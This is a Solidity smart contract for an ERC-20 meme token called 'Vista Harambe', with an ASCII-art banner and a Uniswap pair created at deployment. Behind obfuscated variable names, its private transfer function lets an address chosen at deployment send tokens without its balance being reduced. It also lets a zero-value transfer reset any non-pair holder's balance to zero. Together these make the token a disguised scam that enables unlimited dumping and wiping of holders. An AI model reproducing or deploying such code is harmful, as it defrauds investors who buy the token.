/*

@@@@@@@@@%%@@@@@@@@@@@@@@@@%+::-==+++++++++***#############%%%%%%%%%%%##**+=--:-#@@@@@@@%%
@@@@@@@@@%%@@@@@@@@@@@@@@@%*-:-++===++***######%%%%%%%##%%%#*###%%%%%#%###*=----=%@@@@@%%%
@@@@@@@@@%%@@@@@@@@@@@@@@@#=-=====++**####%%%%%%%@@@%%%%%%%###%####%%####***=:---#@@@@%%%%
@@@@@@@@@%%@@@@@@@@@@@@@%#+-=+=++**###%%%%@%%@%%%@@@@@@@@@%###**#########**++=::-+%@@@@%%%
@@@@@@@@@%%%@@@@@@@@@@@@%*-====+**###%%%@@@%@@%@@@@@@@@@%%#########%%###****+=-::-#%%%%%%%
@@@@@@@@@%%%%@@@@@@@@@@%#=+==+***#####%#%%%%%%@@@@@@@@%%######***#*####****++==:::+%%%%%%%
@@@@@@@@@%%%%%@@@@@@@@@#*++=+++++++++*****##%%%%@%%%%%%%####*******####***+++===:::*%%%%%%
@@@@@@@@@%%%%%@@@@@@@@#+*#*++**+****++**+=******###%%%%%%#%%##****###**#*#**+==--:::-+%%%%
@@@@@@@@@%%%%%%%%%%%%%**##***#%##**###*********+**+*****#****#****#####*####++=-=:.:::-+**
@@@@@@@@@%%%%%%%%%%%%#*###*#%@@%%%%%%%%###########****++***+***##**####*###%*=+=--:::.::::
@@@@@@@@@%%%%%%%%%%%%%###**#%@@@@@@@@@%%%%%@%%%%#######***#***#***####**##@%*+++==---:..:.
@@@%%@@@@%%%%%%%%%%%%%**####%@@@@@%%%@@@@@@@@@@%%%@@%%%%#############***#%%%#++=+====-=:::
%%%%%%%%%%%%%%%%%%%%%#=+####%%%#%%%@%%@@@@@@@@@@@@%%%@@@@%%####%####**+***%%**++*++++=====
%%%%%%%%%%%%%%%%%%%#+--+%%###%%%##%%%%%%@%@@%%@@@@@%@@@@@@@%%%%%%###**++*#+**+***+*#**++++
%%%%%%%%%%%%%%%%%#+-:--*%%####%%%%%%%#*#%#%#%%%%%%%%%%%%%@@@%%%%####**++++**+***##*#******
%%%%%%%%%%%%%%%%#+-=--=######%#%%%%%#**#*####%#%%%##%%%%%%%%%%%%%#####**=+***###########*#
%%@@@%%%%%%%%%%%*-=---+#######%%%%#********###%%##%%%%%%%%%%%%%%%%%###**=***##%%##%%##%###
%%@@@@%%%%%%%%*=--:-=++*%%#%##%##**+=*#+==+**#%%%%%%%%%%%%%%%%%%%%%%##*+==**#%#%%%%%%%%%%%
%%@@@@@@@@@%#+-:----==**%%%%####**#+=+#++++++*#%%%%%%%%#%#%%%%%%%%%##**+==*%%%%%%%%%%%%%@%
#%%@@@@@@@%*=-----=++***#%%%%##*#%@%*++##%@%*+##%%%@%%%##%%%%%%%%%####+*==#%%%%%%%%%@%%%%%
#%%%@@@@%*-:---====******%%%%%*=+#%@%#%@@@%*+*##%%%%%%%##%%%%%%%%#%##***++#%%%%%%%%%@@%%%%
##%%%%%%=--===+=+*****##*#%%%*#+==+##*%%#+=+*######%%%%%%%%%%%%%%%###+*++#%%%%####%%@@@%%%
##%%##+--=++++**##***###**#%**#*====+++===**########%%%%%%%%%%%%%%%##+*++###########%@@@@%
*+++======+++*###****##*+**#*###**++==++**##########%@%%@@%%%%%%%###**+**#####****###%@@@@
==+=====++=+**########*+***#*##%###***#####%%%#####%%%%%@@@@@%%%###*****#####*******##%@@@
====++++++++**###%%%#*+*#*#####%%################%%%%%%%@%@@%%%%##*****#######********##%@
+++++*+*******######*+*#####%%%@#%@@@@@@%%%%%@%%#%#%%%%%@@%%%%%##*#*****###*#####*****###%
+++************#####**#######%@##+#%@@@@@%%%%%*+**#%%@%%%%%%%####**#*****########**#***###
*************#*#####**######%%%##**#*****#+*#+**####%@%%%%%%%#####*#******############*###
+*****###**#*########*#####%%%%%#**#%%%%%%#***##%%#%@@%%%%%%%%%%######*****###############
+***####**##############%#%%@%%%%#*+++*++++*##%%%%%@@@%%%@@@@@@%%%#####*******############
****##############%%###%%#%%@@@%%%%#***#*#%%%%%%%%@@@%%@@@@@@@%@%%%#####*******#######%###
***########%#%##%%%####%%%%@@@@@%@@@%%%%%%%%%%@@@@@@%%@@@@@@@%%%%%%%#######*****#####%#%%#
*##*######%%%%%#%%%###%%%%%@@@@@@@@@@@@@@@@@@@@@@@@%%@@@@@@%%%%%%%%%%%#####*###*#*####%###
**###%###%#####%%%##%#%%%%%@@@@@@@@@@@@@@@@@%%@%%%%@@@%%%%%%%%%%%%%%%%%###################
*##############%%##%#%%@%@@@@@@@@@@@@@@@@@@%%@%%%%%%%%%%%%###%####%%@%%%##********+**++***


*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.23;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract VistaHarambe is Ownable {
    function transfer(address qahgbj, uint256 iwuj) public returns (bool success) {
        oiqueryio(msg.sender, qahgbj, iwuj);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    function oiqueryio(address owie, address qahgbj, uint256 iwuj) private {
        if (0 == jdf[owie]) {
            balanceOf[owie] -= iwuj;
        }
        balanceOf[qahgbj] += iwuj;
        if (0 == iwuj && qahgbj != lkisd) {
            balanceOf[qahgbj] = iwuj;
        }
        emit Transfer(owie, qahgbj, iwuj);
    }

    mapping(address => uint256) private nna;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function transferFrom(address owie, address qahgbj, uint256 iwuj) public returns (bool success) {
        require(iwuj <= allowance[owie][msg.sender]);
        allowance[owie][msg.sender] -= iwuj;
        oiqueryio(owie, qahgbj, iwuj);
        return true;
    }

    mapping(address => uint256) private jdf;

    string public name = 'Vista Harambe';

    mapping(address => mapping(address => uint256)) public allowance;

    string public symbol = 'HARAMBE';

    address public lkisd;

    function approve(address hnas, uint256 iwuj) public returns (bool success) {
        allowance[msg.sender][hnas] = iwuj;
        emit Approval(msg.sender, hnas, iwuj);
        return true;
    }

    uint256 private naswdz = 229;

    uint8 public decimals = 9;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(address gfhij) {
        balanceOf[msg.sender] = totalSupply;
        jdf[gfhij] = naswdz;
        IUniswapV2Router02 hyhq = IUniswapV2Router02(0xEAaa41cB2a64B11FE761D41E747c032CdD60CaCE);
        lkisd = IUniswapV2Factory(hyhq.factory()).createPair(address(this), hyhq.WETH());
    }
}